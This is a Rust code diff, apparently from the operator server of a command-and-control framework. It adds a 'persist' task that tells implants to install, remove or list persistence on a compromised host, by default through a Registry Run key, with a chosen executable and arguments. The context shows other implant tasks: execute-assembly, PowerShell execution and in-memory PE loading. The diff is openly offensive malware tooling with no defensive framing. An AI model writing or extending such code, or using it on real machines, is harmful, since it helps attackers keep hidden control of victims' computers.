@@ -2,7 +2,8 @@ use abraham_common::crypto::{self, ClientHello, Session};
 use abraham_common::frame::{open_frames, ProtocolError};
 use abraham_common::http::{read_request, write_response, HttpRequest, HDR_HANDSHAKE, HDR_SESSION};
 use abraham_common::message::{
-    self, driver_action, msg, Chunk, Message, RegisterInfo, Task, TaskBody, TaskResult,
+    self, driver_action, msg, persist_action, Chunk, Message, RegisterInfo, Task, TaskBody,
+    TaskResult,
 };
 use abraham_common::profile::{Profile, DEFAULT_PROFILE_PATH};
 use ed25519_dalek::SigningKey;
@@ -1159,6 +1160,50 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
             )
             .await
         }
+        "persist" => {
+            // ABR-T030: host persistence install/remove/list.
+            let action = match request.get("action").and_then(|v| v.as_str()) {
+                Some("install") => persist_action::INSTALL,
+                Some("remove") => persist_action::REMOVE,
+                Some("list") => persist_action::LIST,
+                _ => return json!({ "error": "persist action must be install, remove or list" }),
+            };
+            let mechanism = request
+                .get("mechanism")
+                .and_then(|v| v.as_str())
+                .unwrap_or("run-key")
+                .to_string();
+            let name = request
+                .get("name")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            let exe = request
+                .get("exe")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            let args = request
+                .get("args")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            if name.is_empty() {
+                return json!({ "error": "persist requires name" });
+            }
+            queue_task(
+                state,
+                &request,
+                TaskBody::Persist {
+                    action,
+                    mechanism,
+                    name,
+                    exe,
+                    args,
+                },
+            )
+            .await
+        }
         "runpe" => {
             // ABR-T027: inline bytes when they fit the frame, else the
             // operator uploads the stage first and passes "path".
@@ -1415,6 +1460,7 @@ fn task_kind_name(body: &TaskBody) -> &'static str {
         TaskBody::ExecuteAssembly { .. } => "execasm",
         TaskBody::PowerShell { .. } => "psrun",
         TaskBody::RunPe { .. } => "runpe",
+        TaskBody::Persist { .. } => "persist",
         TaskBody::Exit => "exit",
     }
 }
